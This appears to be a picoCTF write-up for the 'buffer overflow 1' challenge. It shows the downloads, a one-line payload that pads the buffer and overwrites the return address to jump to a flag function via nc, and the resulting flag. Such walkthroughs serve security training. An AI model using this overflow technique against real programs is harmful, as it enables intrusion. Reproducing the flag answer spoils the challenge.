## buffer overflow 1

# objetivo
- Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln). You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using `nc saturn.picoctf.net 65003`

# Hints
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.

# solucion
``` bash 
(kali㉿kali)-[~/binary]
└─$ wget https://artifacts.picoctf.net/c/250/vuln.c
--2022-11-25 12:12:08--  https://artifacts.picoctf.net/c/250/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 65.9.149.85, 65.9.149.57, 65.9.149.123, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|65.9.149.85|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 769 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c         100%     769  --.-KB/s    in 0s          

2022-11-25 12:12:09 (4.84 MB/s) - ‘vuln.c’ saved [769/769]

                                                         
┌──(kali㉿kali)-[~/binary]
└─$ wget https://artifacts.picoctf.net/c/250/vuln  
--2022-11-25 12:12:21--  https://artifacts.picoctf.net/c/250/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 65.9.149.62, 65.9.149.123, 65.9.149.57, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|65.9.149.62|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15704 (15K) [application/octet-stream]
Saving to: ‘vuln’

vuln           100%  15.34K  --.-KB/s    in 0.02s       

2022-11-25 12:12:22 (724 KB/s) - ‘vuln’ saved [15704/15704]

(kali㉿kali)-[~/binary]
└─$ code vuln.c                                  
                                                         
┌──(kali㉿kali)-[~/binary]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | nc saturn.picoctf.net 65003
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_ad2f467b} 
```
# bandera
- picoCTF{addr3ss3s_ar3_3asy_ad2f467b}